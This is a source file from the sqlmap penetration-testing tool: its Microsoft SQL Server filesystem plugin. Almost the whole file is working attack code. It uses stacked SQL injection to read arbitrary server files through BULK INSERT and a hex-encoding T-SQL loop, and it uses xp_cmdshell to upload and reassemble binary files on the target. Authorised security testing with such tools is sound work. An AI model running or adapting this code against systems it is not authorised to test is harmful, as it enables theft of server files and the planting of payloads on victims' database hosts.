#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import codecs
import ntpath
import os

from lib.core.common import getRange
from lib.core.common import posixToNtSlashes
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapNoneDataException
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.request import inject

from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def __init__(self):
        GenericFilesystem.__init__(self)

    def unionReadFile(self, rFile):
        errMsg  = "Microsoft SQL Server does not support file reading "
        errMsg += "with UNION query SQL injection technique"
        raise sqlmapUnsupportedFeatureException(errMsg)

    def stackedReadFile(self, rFile):
        infoMsg = "fetching file: '%s'" % rFile
        logger.info(infoMsg)

        result = []
        txtTbl = self.fileTblName
        hexTbl = "%shex" % self.fileTblName

        self.createSupportTbl(txtTbl, self.tblField, "text")
        inject.goStacked("DROP TABLE %s" % hexTbl)
        inject.goStacked("CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s)" % (hexTbl, self.tblField, "VARCHAR(4096)"))

        logger.debug("loading the content of file '%s' into support table" % rFile)
        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (txtTbl, rFile, randomStr(10), randomStr(10)), silent=True)

        # Reference: http://support.microsoft.com/kb/104829
        binToHexQuery = """
        DECLARE @charset VARCHAR(16)
        DECLARE @counter INT
        DECLARE @hexstr VARCHAR(4096)
        DECLARE @length INT
        DECLARE @chunk INT

        SET @charset = '0123456789ABCDEF'
        SET @counter = 1
        SET @hexstr = ''
        SET @length = (SELECT DATALENGTH(%s) FROM %s)
        SET @chunk = 1024

        WHILE (@counter <= @length)
        BEGIN
            DECLARE @tempint INT
            DECLARE @firstint INT
            DECLARE @secondint INT

            SET @tempint = CONVERT(INT, (SELECT ASCII(SUBSTRING(%s, @counter, 1)) FROM %s))
            SET @firstint = floor(@tempint/16)
            SET @secondint = @tempint - (@firstint * 16)
            SET @hexstr = @hexstr + SUBSTRING(@charset, @firstint+1, 1) + SUBSTRING(@charset, @secondint+1, 1)

            SET @counter = @counter + 1

            IF @counter %% @chunk = 0
            BEGIN
                INSERT INTO %s(%s) VALUES(@hexstr)
                SET @hexstr = ''
            END
        END

        IF @counter %% (@chunk) != 0
        BEGIN
            INSERT INTO %s(%s) VALUES(@hexstr)
        END
        """ % (self.tblField, txtTbl, self.tblField, txtTbl, hexTbl, self.tblField, hexTbl, self.tblField)

        binToHexQuery = binToHexQuery.replace("    ", "").replace("\n", " ")
        inject.goStacked(binToHexQuery)

        if kb.unionPosition is not None:
            result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), sort=False, resumeValue=False, blind=False, error=False)

        if not result:
            result = []
            count  = inject.getValue("SELECT COUNT(%s) FROM %s" % (self.tblField, hexTbl), resumeValue=False, charsetType=2)

            if not count.isdigit() or not len(count) or count == "0":
                errMsg  = "unable to retrieve the content of the "
                errMsg += "file '%s'" % rFile
                raise sqlmapNoneDataException(errMsg)

            indexRange = getRange(count)

            for index in indexRange:
                chunk = inject.getValue("SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s ORDER BY id ASC) ORDER BY id ASC" % (self.tblField, hexTbl, self.tblField, index, self.tblField, hexTbl), unpack=False, resumeValue=False, sort=False, charsetType=3)
                result.append(chunk)

        inject.goStacked("DROP TABLE %s" % hexTbl)

        return result

    def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
        errMsg  = "Microsoft SQL Server does not support file upload with "
        errMsg += "UNION query SQL injection technique"
        raise sqlmapUnsupportedFeatureException(errMsg)

    def stackedWriteFile(self, wFile, dFile, fileType, confirm=True):
        # NOTE: this is needed here because we use xp_cmdshell extended
        # procedure to write a file on the back-end Microsoft SQL Server
        # file system. Maybe it won't be required to write text files
        self.initEnv()

        self.getRemoteTempPath()

        debugMsg  = "going to use xp_cmdshell extended procedure to write "
        debugMsg += "the %s file content to file '%s'" % (fileType, dFile)
        logger.debug(debugMsg)

        debugSize    = 0xFF00
        tmpPath      = posixToNtSlashes(conf.tmpPath)
        dFile        = posixToNtSlashes(dFile)
        dFileName    = ntpath.basename(dFile)
        wFileSize    = os.path.getsize(wFile)
        wFilePointer = codecs.open(wFile, "rb")
        wFileContent = wFilePointer.read()
        wFilePointer.close()

        if wFileSize < debugSize:
            chunkName = self.updateBinChunk(wFileContent, tmpPath)
            sFile     = "%s\%s" % (tmpPath, dFileName)

            logger.debug("moving binary file %s to %s" % (sFile, dFile))

            commands = ("cd \"%s\"" % tmpPath, "ren %s %s" % (chunkName, dFileName), "move /Y %s %s" % (dFileName, dFile))
            complComm = " & ".join(command for command in commands)

            self.execCmd(complComm)

        else:
            infoMsg  = "the %s file is bigger than %d " % (fileType, debugSize)
            infoMsg += "bytes. sqlmap will split it into chunks, upload "
            infoMsg += "them and recreate the original file out of the "
            infoMsg += "binary chunks server-side, wait.."
            logger.info(infoMsg)

            counter = 1

            for i in range(0, wFileSize, debugSize):
                wFileChunk = wFileContent[i:i + debugSize]
                chunkName  = self.updateBinChunk(wFileChunk, tmpPath)

                if i == 0:
                    infoMsg = "renaming chunk "
                    copyCmd = "ren %s %s" % (chunkName, dFileName)
                else:
                    infoMsg = "appending chunk "
                    copyCmd = "copy /B /Y %s+%s %s" % (dFileName, chunkName, dFileName)

                infoMsg += "%s\%s to %s\%s" % (tmpPath, chunkName, tmpPath, dFileName)
                logger.debug(infoMsg)

                commands = ("cd %s" % tmpPath, copyCmd, "del /F %s" % chunkName)
                complComm = " & ".join(command for command in commands)

                self.execCmd(complComm)

                logger.info("file chunk %d written" % counter)

                counter += 1

            sFile = "%s\%s" % (tmpPath, dFileName)

            logger.debug("moving binary file %s to %s" % (sFile, dFile))

            commands = ("cd %s" % tmpPath, "move /Y %s %s" % (dFileName, dFile))
            complComm = " & ".join(command for command in commands)

            self.execCmd(complComm)

        if confirm:
            self.askCheckWrittenFile(wFile, dFile, fileType)
